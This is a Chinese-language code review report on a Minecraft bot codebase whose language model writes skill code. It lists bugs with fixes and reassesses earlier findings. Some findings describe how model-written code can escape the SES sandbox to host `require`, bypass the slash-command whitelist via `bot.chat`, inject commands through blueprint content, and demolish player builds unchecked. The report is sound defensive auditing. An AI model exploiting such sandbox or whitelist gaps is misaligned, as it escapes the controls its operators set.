`lockdown.js:20` + `coder.js:189-194`

（正文见 §3 D1，此处不重复。**这是本轮最重要的发现**，且它把第一轮第 1 条从"入口没锁"升级为"锁上了也没用"。）

### D2 `skills.digTunnel` 的 `ok` 未 import：每次正常返回必抛 `ReferenceError`
`skills.js:5750`

**这是什么**：`digTunnel` 是"按方向挖 N 步"的模型可见技能，末尾 `return ok({ steps: n, to });`。

**问题**：`skills.js` 第 1-28 行的 import 清单里**没有 `contract.js`**，模块作用域也没有 `ok`（`grep -n "\bok\b"` 只命中 8 处**函数内部**的 `const ok = ...`）。执行越过 `:5742` 的 `if (!run.ok) return run;` 就必抛。**按实测复现**：模型调 `digTunnel(bot,1,0,3)` → `runSteps` 正常跑完（`run.ok===true`）→ `:5749` 发 `tunnel-done` 事件 → `:5750` 抛 `ReferenceError: ok is not defined`。挖了最多 60 秒之后以异常收场。
旁证：第一轮 t4 的 eslint 实测把 `skills.js:5750 ok` 列在 `no-undef` 里（7 处真 ReferenceError 之一）。

**最小修复**：`skills.js` 顶部加 `import { ok } from './contract.js';`；或把 `:5750` 改成 `return { ok: true, data: { steps: n, to } };`。另建议把 `step_runner.js:149` 改成 `if (failed.length && doneSteps === 0) return fail(...)`（第一轮第 10 条已报，这里一并）。

**不修会怎样**：这个技能 100% 抛错，错误信息与挖掘逻辑无关，排查会被引向错误方向。

### D3 `buildFromSchematic` 用变量拼 `/setblock` 直发 `bot.chat`，绕过命令白名单（也是 preflight 正则的漏网实例）
`skills.js:3998-4000`

**这是什么**：命令模式的蓝图放置，逐块拼出 `const cmd = '/setblock ' + wx + ... + blockStateToString(plan); bot.chat(cmd);`。

**问题（两层）**：
1. **绕过唯一命令出口**：全系统约定"斜杠命令只许从 `atom_input_misc.command()` 出去"（`atom_input_misc.js:51` 自述"全系统唯一能发命令的地方"），那里有 `slashVerdict` 白名单 + `level`/`cheat` 两层判定。这里直接 `bot.chat`，白名单完全不经。
2. **preflight 抓不到**：`preflight.mjs` 的 `slash-command-owner` 规则是正则 `/bot\.chat\s*\([^\n]*?['"`]\s*\//`——要求**同一行出现字面量 `/`**。`bot.chat(cmd)` 的实参是变量，**不匹配**。所以第一轮 S22 预测的"正则可绕过"在这里有了一条真实实例，而且它已经在生产代码里。
3. 附带：`blockStateToString(plan)` 的内容来自蓝图文件（`:3998`），若蓝图里的方块名带换行，`bot.chat` 会在服务端被当成多条命令 —— 这是把"文件内容"变成"命令"的注入面。

**最小修复**：改用 `await command(bot, 'setblock', [wx, wy, wz, state], { cheat: true })`（同文件 `:1144` 已经在这么用）。**一行改动**，同时恢复白名单与 preflight 可见性。

**不修会怎样**：命令白名单这条"安全不变量"在生产里有一条常开后门；任何"内容 → 命令"的注入都能从这里过。

### D4 `takeFromChest` 按"打算取多少"计数，窗口中途关掉也报成功
`skills.js:1480-1492`

**这是什么**：从记得的箱子取物，返回 boolean。

**问题**：循环里 `totalTaken += toTakeFromSlot;`（`:1486`）是**意图值**，`await chestContainer.withdraw(...)`（`:1484`）没有返回值校验；最后 `return totalTaken > 0;`（`:1492`）。触发场景很常见：玩家在 `takeFromChest` 期间按 `!stop`，或 bot 走远 >10 格被服务端静默关窗（`checkWindow` 的注释 `:366` 就写着这个现象）→ `withdraw` 全部失败/抛错被上层吞 → 函数仍返回 `true`。上层据此认为"材料到手了"，继续下一步合成，然后在 `craftOnce` 才发现没料。
（对照：`act_container.withdraw` 是同功能的原子版，带 `assertUsableWindow`。）

**最小修复**：改成用**背包增量**判成功：进函数前 `const before = countItem(bot, itemName)`，返回 `return countItem(bot, itemName) - before > 0;`。或者直接转发到 `act_container.withdraw`。

**不修会怎样**：箱子取物是"任务链的供料口"，它谎报成功会让后面所有步骤连锁失败，且失败点离真因很远（合成失败而不是取物失败）。

### D5 `loadFurnace` 不检查输入槽，会覆盖别人正在炼的料
`skills.js:478`

**这是什么**：往熔炉填料（先燃料后输入），模型可见。

**问题**：`furnace.putInput(mc.getItemId(itemName), null, num)` **无条件执行**，前面只判断了燃料（`:458`）。所以熔炉里已有别人的 5 个铁矿时，调 `loadFurnace` 会把自己的料压进去（服务端会把原来的退出来或合并，取决于槽位）—— 原子版 `act_craft.furnaceLoad` 对这件事的处理是返回 `OCCUPIED`（`skills.js:599-602` 的注释自己写明了"这条一度被我漏掉，是 captain 抓出来的真 bug，已修并有离线用例锁住"）。
**也就是说：修好的那份在 act_craft，没修的那份还挂在 skills 上给模型用。**

**最小修复**：`skills.loadFurnace` 开头加一句 `if (furnace.inputItem()) return { ok:false, reason:'occupied' };`（3 行）。或直接转发 `act_craft.furnaceLoad`。

**不修会怎样**：多人/多 bot 共用一个熔炉时互相覆盖；而"熔炉里有别人的料就不抢"这条保护，实际上只在原子层生效。

## Should fix

### D6 `flow_mine` 的完成计数器把同一物品数两遍：`mine cobblestone 3` 挖到 2 个就报「完成，count=4」
`flow_mine.js:268-270`（`countAll`）、`:103-140`（`oreNames`）、`:173-184`（`ORE_DROP`）

**这是什么**：`mine(bot, ore, count)` 用**背包增量**判完成（`:469-474`，这个判据本身是对的，注释 `:452-456` 还专门修过"挖了没捡却报成功"）。

**问题**：`countAll` 把**两套名字都累加**：
```js
const countAll = () =>
    dropNames.reduce((n,name) => n + countItem(bot,name), 0)   // 掉落物名
    + names.reduce((n,name) => n + countItem(bot,name), 0);    // 方块/物品名
```
而 `oreNames('cobblestone')` 现在走权威表（`:120-131`），返回 `['cobblestone','stone']`；`dropNames` 是 `[...new Set(names.map(n => ORE_DROP[n] ?? n))]`（`:267`）——`ORE_DROP`（`:173-184`）里没有 `cobblestone`/`stone` 这两个键，所以 `dropNames` 也是 `['cobblestone','stone']`。
于是 **`cobblestone` 同时出现在两边** → `countAll` 把它数两遍。挖 1 块石头得到 1 个 cobblestone，`countAll` 就 +2 → `gained` 翻倍 → `want=3` 时**挖到 2 个就判 `done>=want`，并返回 `count: 4`**（`:474`）。
`Set` 只在 `dropNames` **内部**去重（`:267`），去不掉"`names` 与 `dropNames` 之间"的重叠。凡是"物品名本身就是方块名"的场景（cobblestone、stone、dirt、sand、oak_log…）都会中招；`t137` 的注释（`:108-118`）恰好证明 `mine cobblestone c=3` 是真实调用形态。

**最小修复**：`countAll` 只数一个集合：
```js
const countNames = [...new Set([...dropNames, ...names])];
const countAll = () => countNames.reduce((n,name) => n + countItem(bot,name), 0);
```
（对 `iron_ore→raw_iron` 这类"名字不重叠"的场景行为完全不变，只去掉重叠部分的重复计数。）

**不修会怎样**：采集类任务普遍**提前报完成且数量虚高一倍**，上层据此收工，玩家看到"任务完成但材料只有一半"。**这条的具体倍数需跑一次 `mine cobblestone 3` 用 TRACE 确认**（机制已确定，倍数为推演）。

### D7 `skills.breakBlockAt` 完全没有建筑保护，而 `placeBlock` 有 —— 同一份文件里两套标准
`skills.js:1007-1078` 对照 `:1190-1195`

**这是什么**：`breakBlockAt` 是"挖掉任意坐标"的模型可见技能；`placeBlock` 在目标格有非空方块时会**先检查 `wmIsPlayerBuilt`，是玩家建筑就拒绝**（`:1190-1195`，注释写明"这是历史上把一整片 5x5x4 木板结构拆光的根源，所以加两道闸"）。

**问题**：同样"会破坏方块"的两条路，一条有闸一条没有。模型（或一个有 bug 的循环）调 `breakBlockAt` 逐格扫过玩家房子，**没有任何拒绝**，唯一成本是每次一个 `holdDig`。`breakBlockAt` 也不查 `bot.interrupt_code`（对比 `act_dig.digBlock:38`）。

**最小修复**：`breakBlockAt` 里照抄 `placeBlock` 的那道闸（3 行）：
```js
if (wmIsPlayerBuilt(block.name) && !modesIsOn(bot,'cheat')) { log(...); return false; }
```
并在函数开头加 `if (bot.interrupt_code) return false;`。

**不修会怎样**：模型有一条"合法、无闸、不可中断"的拆除路径；`placeBlock` 上那道精心写的保护等于只挡住了自己。

### D8 `skills.waitUntil` 对 `false` 的判定与 `atom_wait.waitUntil` 相反 —— 而模型看到的是 skills 那份
`skills.js:39-67` 对照 `atom_wait.js:38-74`

**这是什么**：两个同名函数，都叫"等到条件成立"。

**问题**：谓词语义**相反**：
- skills 版：`if (predicate()) return {ok:true,...}`（`:59`）—— `false` = 还没好。
- atom 版：`if (value !== undefined && value !== null) return ok(...)`（`:67`）—— **`false` = 完成了**。

`atom_wait.js` 文件头（`:10-12`）明确写着这个差异的代价："atom_use 那份曾经把 `false` 当成'还没完成'，导致门'关上'永远判超时（实测踩过）"。**skills.js 里那份正是被修掉的那个写法**，而且它在 `always_show_skills` 白名单里（`skill_library.js:43`）——模型拿到的文档和函数都是错的那一份。返回形状也不同（`{ok,waitedMs,reason,label}` vs ActionResult），模型按其中一个写代码、库按另一个实现，就会错。

**最小修复**：`skills.waitUntil` 改成 `return atomWait(waitUntilAtom)(predicate, { bot, ...opts })` 的薄包装并保留旧返回字段；或者把 skills 版删掉、文档改指向原子。**两者选一，不要留两份。**

**不修会怎样**：任何"等门开/等方块变空气/等背包满"的模型自写循环，用 skills 版写就会在"条件为 false 但确实完成了"的谓词上永久超时；用 atom 版写则相反。这是**静默行为差异**，不会报错。

## Nice to have

### D9 `skills.equip` 不查中断、不校验槽、不验证结果
`skills.js:1285-1331` 对照 `act_items.equip:50-73`

**问题**：`if (itemName === 'hand') unequip`；其余按名字后缀猜槽位（`:1311-1328`）；**没有任何 `bot.interrupt_code` 检查**，也没有"戴上没有"的读回验证。`act_items.equip` 三样都有（`:51/52/64-72`，还带 `verified` 三态）。
**后果**：`!stop` 期间 `skills.equip` 仍会跑完；玩家建筑/装备操作不可中断。不报错，但"我戴上了"可能不成立。
**修法**：转发到 `act_items.equip`（一行），或补读回验证。
**不修会怎样**：一致性缺口，且是第一轮 N2「闸失效」的一个旁支（中断不生效）。

### D10 `skills.canReach` 默认 4.3，`query_perceive.canReach` 默认 5.1
`skills.js:1911` 对照 `query_perceive.js:73`

**问题**：同名同义，默认值不同。`query_perceive` 的 5.1 有实测依据（`act_dig.js:31-35` 记着"Paper 实测 6.11 也能挖、mineflayer 用 5.1"）；skills 的 4.3 没有依据可循。
**修法**：skills 版转发 `query_perceive.canReach`。
**不修会怎样**：同一个"够不够得着"在两条路径上差 0.8 格 —— `collectBlock` 用它判"要不要再贴近一次"（`:899/904`），差 0.8 会导致多余的走位。

### D11 `skills.js:571-586` 的 `if (!walk)` 恒为假 —— 熔炉"走不到就自己放一个"的兜底是死代码
`skills.js:570-586`

**这是什么**：`smeltItem` 里"熔炉走不到 → 用背包里的就地放一个"的兜底。

**问题**：`const walk = await goToBlockBounded(...)` 返回的是**对象** `{ok, distance, reason}`（`:347-353`），恒真；`if (!walk)` 因此**永远不成立**，整个兜底分支（`:571-586`）永远不执行。作者本想写 `if (!walk.ok)`。
**后果**：那 90~180 秒"为了墙后/水对面的熔炉原地打转"的老问题**没被修掉**——这段代码是修它的，但判断写错，等于没修。而且 `:574/583` 里引用的 `walk.reason` 只有在分支内才用到，说明作者确实是按"失败"设计的。
**修法**：`if (!walk.ok)`（一个字符）。
**不修会怎样**：`smeltItem` 在"熔炉不可达"这个已知场景下继续打转 15 秒 ×（每次），并且日志不会说"走不到"。

### D12 `putInChest` / `viewChest` 用裸 `container.*`，不经 `act_container`
`skills.js:1437`（`opened.container.deposit`）、`:1510`（`containerItems`）

**问题**：同 #25/#27。`act_container` 有 `openContainer/assertUsableWindow/deposit/withdraw` 全套，skills 这三条自己开、自己关、自己不校验窗口是否还有效（`openKnownChest` 返回的 `container` 可能在返回后已被服务端关掉）。`putInChest` 同样不核对背包是否真的少了。
**修法**：转发到 `act_container.deposit`/`windowItems`。
**不修会怎样**：与 D4 同族（意图即成功），只是这里连 `totalTaken` 计数都没有，直接 `return true`。

---

## 5. 对第一轮 18 条的复核意见

| 第一轮 | 结论 | 依据 |
|---|---|---|
| **N1** `surveyArea` r=64 同步 110 万格 | **维持「已降级」**（第一轮已按 t5 的 162ms 反证降为 Should，主报告第 13 条） | 本轮未找到新的阻塞证据；`skills.js:5427` 的实现与描述一致（同步、无上限）。**不加强** |
| **N2** 互斥闸 owner 恒 `'adhoc'` | **加强** | 本轮发现 `goToGoal`(1734)/`goToPosition`(1915)/`goToPlayer`(2027) 都是**直驱 pathfinder 的模型可见入口**，都不进闸 —— 绕闸的调用点从"12 处"再增加 3 个"模型可直接触发的"。 |
| **N3** 12 处直驱 | **加强**（同上） | `skills.js` 里的 `goToGoal/goToPosition/goToPlayer/moveAway/attackEntity/defendSelf` 都在自己 `setMovements`/`setGoal`；模型调 `skills.goToPosition` 就绕过了整个 nav 闸。**这是第一轮没数到的**（当时只 grep 了 `await moveTo(` 这类，漏了 `pf.goals` + `bot.pathfinder.setMovements` 的组合） |
| **N4** 地标保护清单恒空 | **维持 Must** | 本轮未推翻；且发现 `protectedPlaces` 的调用方只有 `flow_collect_plan:113`，模型侧的 `breakBlockAt` 完全不受它约束（见 D7）→ **影响范围比第一轮写的大** |
| **N5** `scanSphere` 先删后读 | **维持** | 未读该函数（第一轮读过），本轮无新证据 |
| **N6 / 第 10 条** `step_runner` 全失败报 ok + `digTunnel` | **加强并纠正** | 本轮确认 `ok` 未 import 导致**必抛**（D2），比"静默假成功"更严重；`step_runner.js:149` 的 `return ok` 仍是同一链的上游 |
| **N7** `digdown` 不校验就 ok | **维持 Should** | 本轮读了 `flow_mine` 侧反而更规范（用背包增量），说明问题限于 `executor.js:363` |
| **N8** 补垫失败被吞 | **维持 Should** | 未读该区域（第一轮读过），无新证据 |
| **N9** 地下球顶造假面 | **维持 Should** | 无新证据 |
| **N10** `noteDugSurface` 压平多层 | **维持 Should** | 无新证据 |
| **N11** `fail` 表只增不减 | **维持 Should** | 无新证据 |
| **N12** 扫描异常被吞 | **维持 Should** | 无新证据 |
| **N13** 每步 2 次 SQL | **维持 Should** | 无新证据 |
| **N14** 每轮整球重扫 | **维持 Should** | 无新证据 |
| **N15** skills 与原子层分叉 | **大幅加强，具体化为 §2 的完整表** | 第一轮只列 3 条；本轮核实 7 条，并给出 45 条"有对应物"的完整清单。**主报告第 20 条应据此重写为"45 个导出有两份实现，7 条已确认给出不同答案"** |
| **N16** 规划态当执行态 | **维持 Should** | 本轮读 `strat_obtain`（`planObtain`）未发现更严重的同类；`flow_mine` 用的是实时 `countAll()` → 反而是正面样例 |
| **N17/N18** plan3D 开销 | **维持 Nice** | 无新证据 |

**推翻 0 条。** 加强 4 条（N2、N3、N6、N15），其中 **N15 需要按 §2 重写**。

---

## 6. Lean 结算

分叉表（§2）给出的是"能删的候选"，但**能不能删取决于"模型的调用点"**——而模型调用不是 grep 能看见的（第一轮已立规矩）。所以分三类：

| 类 | 条目 | 可删行数 | 前提 |
|---|---|---:|---|
| **A. 真转发，可直接删（让调用方走原子层）** | `craftRecipe`(198-284≈86)、`smeltItem`(532-655≈123)、`consume`(1524-1542≈18)、`followEntity`(5662-5688≈26)、`scanTreeAt`(5753-5785≈32)、`planTreeChop`(5787-5819≈32)、`isSafeHere`(5173-5240≈67)、`checkWindow`(372-383≈11) | **≈395 行** | 把 `commands/actions.js`、`npc/*` 里对它们的调用改到原子层；模型技能目录同步改名 |
| **B. 重复实现，删掉更安全（保留原子层那份）** | `loadFurnace`(439-481≈42)、`putInChest`(1413-1447≈34)、`takeFromChest`(1449-1493≈44)、`viewChest`(1495-1522≈27)、`equip`(1285-1331≈46)、`discard`(1333-1374≈41)、`attackEntity`(716-751≈35)、`goToBed`(2312-2343≈31)、`useDoor`(2233-2311≈78)、`tillAndSow`(2344-2420≈76)、`tradeWithVillager`(2548-2626≈78)、`canReach/eyePosition/reachDistanceTo`(1897-1914≈17)、`waitUntil`(39-67≈28)、`wait`(287-310≈23) | **≈500 行** | 需要先确认模型不依赖它们的"boolean 返回"；`attackEntity`/`useDoor`/`tillAndSow`/`tradeWithVillager` 的差异点未逐行核对（⚠️），删之前必须读一遍 |
| **C. 不该删（唯一实现或模型主要入口）** | 仓储族 11 个、建造族 7 个、蓝图族 3 个、`surveyInventory`/`reportStatus`/`makeRoomForBot`、`giveToPlayer`、`goToPlayer`、`markDanger`、`digTunnel`（修好后保留）、`collectBlock`/`pickupNearbyItems`（模型常用） | 0 | — |

**合计**：**约 −895 行**（A 395 + B 500），占 skills.js 的 15%。

**删之前必须做的 grep（已做，结果如下）**：按共同规范第 4 条与 captain 的提醒（t10 那边 `autoBuild` 因 3 个离线生成器在用而**不能删**），我把 A/B 两类共 19 个名字在 `tasks/` 与 `tools/` 里各 grep 了一遍：

```
isSafeHere craftRecipe smeltItem consume waitUntil checkWindow loadFurnace putInChest
takeFromChest viewChest equip discard attackEntity goToBed useDoor tillAndSow
tradeWithVillager canReach followEntity        →  tasks=0  tools=0   （19/19 全部）
```
其中 `checkWindow`/`loadFurnace`/`putInChest`/`takeFromChest`/`tillAndSow`/`canReach`/`followEntity` **连 `skills.js` 之外的 src 也 0 引用** —— 但**这不等于死代码**：它们是模型经 SES 沙箱可调的 API（§3 的前提），grep 看不见模型。所以结论是"**没有离线工具依赖它们**"，而不是"可以直接删"。

**代价（必须写清楚）**：删 B 类会改变**模型可见的 API 面**——`skill_library.js` 的目录与 `always_show_skills` 白名单要同步改（`skill_library.js:32-44`），否则模型会调一个不存在的名字（`coder.js:119-133` 的 `_lintCode` 会在"函数不存在"时报错，算是安全网，但会浪费一整轮 LLM 调用）。**依赖改动：0 个新依赖**；`prismarine-schematic` 虽然 0 import，但蓝图族功能本身还在用，**不建议删**。
**保守结论**：**Lean: -895 行 可能**（A 类是纯删，风险低；B 类需先补 4 条逐行核对——`attackEntity`/`useDoor`/`tillAndSow`/`tradeWithVillager` 的差异点我标了 ⚠️ ——建议分两步做）。

---

## 7. Verdict 与未验证

**Verdict**：`skills.js` 是一份**质量两极**的文件——`flow_mine`/`strat_obtain`/`craftOnce` 这些"新写的"部分注释详尽、判据严谨（用背包增量、三态判据、预算取小），而 `skills.js` 里"老的"那 90 个函数是**各功能域的一套独立实现**，既不转发也不对齐原子层，于是同一个问题有 2~3 个答案（§2 表：45 个导出有对应物，7 条已确认答案不同）。最严重的一条不在这个文件里：**SES 沙箱 3 行可逃逸（D1），实测拿到宿主 `require`** —— 这让"代码执行默认开启"从"有风险"变成"等于 RCE"。

**Not checked**：
- `skills.js` 约 3400 行（§1.1 列出的段落）**未逐行读**：熔炉族细节、战斗、建造族、仓储族、攀爬/树。它们的**存在与边界**由导出表确定，函数体只做了抽查。
- `act_*.js` 15 个里只有 `act_items`（全文）、`act_dig`/`act_step`（第一轮全文）读过；其余 12 个只有导出表 + grep。**§2 表里标 ⚠️ 的 30 余条「差异点」都是推断，不是核实。**
- `strat_obtain.js` 只读 `planObtain` 开头 95 行，`obtain()`(690-917) 与 `expand` 主体**未读**。
- `query_*.js` 8 个里 4 个沿用第一轮；`query_target`/`query_tree`/`query_stand`/`query_drops` 本次未读。
- **D1 的逃逸只在 Node 24 + 本机 ses 版本上实测过**；未验证"通过 endowment 能否直接拿到 `fs` 模块对象"（间接的 `require` 已经够用）。
- 越权表（§3）里"模型怎么写出这段代码"是**按 API 签名推的**，没有真的让一个模型去写并跑一遍；后果链是代码可证的，但"模型会不会这么写"未测。
- D6 的倍数（2×）是从 `countAll` 的两行相加推出来的，**未跑 `mine cobblestone 3` 实测**（机制确定，倍数待验）。
- **§3.5 里"`follow` 超时永不生效"我只核对了参数名不一致的两行**（`composite_registry.js:78` 传 `deadlineMs` / `flow_follow.js:87` 解构 `timeoutMs`），**没有跑一次 `!do follow` 观察它是否真的永不超时**。参数名错配是确定的，运行时表现（是否还有别处兜底）未实测。
- `tasks/construction_tasks/` 只做了 `ls` + 一次 `grep "setblock\|skills\."`，**没有逐个读那 5 个生成器**，所以"与 skills 建造族无重复实现"只是"没查到证据"，不是"已证明没有"。
